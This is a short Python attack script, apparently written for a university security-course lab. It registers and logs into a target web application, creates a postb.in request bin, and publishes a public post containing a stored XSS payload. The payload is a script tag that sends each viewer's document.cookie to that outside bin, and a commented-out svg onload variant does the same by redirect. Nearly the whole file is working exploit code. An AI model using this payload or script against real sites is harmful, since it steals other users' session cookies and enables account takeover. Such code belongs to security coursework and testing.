import requests as req
import random

def xssvuln1():

    SERVER = "http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt"
    session = req.session()

    #user = "h4ck3rm3n"
    #password = "h4ck3rm3n"

    user = str(random.randint(2 ** 27, 2 ** 28))
    password = str(random.randint(2 ** 27, 2 ** 28))

    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/register', data=params)

    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

    print(r.text)
    print(r.headers)

    #### CREATE A BIN TO RECEIVE COOKIES ####
    attackbin = req.post("https://postb.in/api/bin")
    attackbinid = "https://postb.in/" + attackbin.text[10:37] + "?hello="

    print(attackbinid)

    #### PAYLOAD WITH ATTACKER BIN ####
    #   payload = "<svg/onload=\"window.location=\'\'" + attackbinid + "\'\' + document.cookie\">"
    payload = "<script>\nx = new XMLHttpRequest();\n x.open(\"GET\", \"https://postb.in/" + attackbin.text[10:37] + "?hello=\" + document.cookie, true);\n x.send();\n </script>"
    type = "Public"

    params = {'content': payload, 'type': type}
    rep = session.post(SERVER + '/create_post', data=params, cookies=session.cookies)

    print(rep.text)
    print(rep.headers)

    print("https://postb.in/b/" + attackbin.text[10:37])

    print("attacker username: " + user)
    print("attacker password: " + password)

xssvuln1()